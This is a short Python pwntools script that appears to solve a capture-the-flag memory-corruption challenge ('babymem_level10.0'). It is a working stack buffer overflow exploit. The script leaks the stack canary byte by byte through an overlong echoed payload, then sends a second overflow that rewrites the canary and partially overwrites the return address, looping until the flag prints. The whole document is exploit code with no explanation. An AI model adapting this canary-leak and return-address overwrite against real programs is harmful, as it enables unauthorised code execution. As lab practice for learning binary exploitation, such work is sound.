from pwn import * 
import binascii
import random

context.log_level='debug'
context.arch = 'amd64'
context.bits = 64
context.terminal = ['tmux', 'splitw', '-v']
payload_size = 0

while True:
    proc = process(['/challenge/babymem_level10.0'])
    # leak canary1
    payload_size += 9
    proc.recvuntil('Payload size: ')
    proc.sendline(str(payload_size))
    payload = b'REPEAT' + (payload_size - 6) * b'A'
    proc.recvuntil('bytes)!')
    proc.send(payload)
    proc.recvuntil('You said: ')
    ret = proc.recvuntil('Backdoor')
    canary1 = b'\x00' + ret[payload_size:payload_size + 7]
    # modify ret
    payload_size2 = 328 + 2
    proc.recvuntil('Payload size: ')
    proc.sendline(str(payload_size2))
    payload = 41 * canary1 + p8(0x18) + p8(0x18)
    proc.recvuntil('bytes)!')
    proc.send(payload)
    proc.recvuntil('You said: ')
    ret = proc.recvall()
    if b'}' in ret:
        print(ret)
        break
